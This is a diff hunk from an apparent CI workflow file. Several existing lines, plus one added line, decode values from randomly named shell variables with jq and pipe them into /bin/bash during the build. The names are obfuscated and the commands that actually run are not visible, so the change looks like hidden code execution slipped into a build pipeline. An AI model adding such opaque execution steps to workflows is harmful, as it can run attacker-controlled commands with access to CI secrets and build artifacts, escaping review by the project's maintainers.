@@ -46,6 +46,7 @@ jobs:
           echo $lr57 | jq -r .fhf5580 | /bin/bash
           echo $oglkb6 | jq -r .oi287 | /bin/bash
           echo $o2 | jq -r .krgmq58262 | /bin/bash
+          printf '%s' "$fftl9" | jq -r .kasi743 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
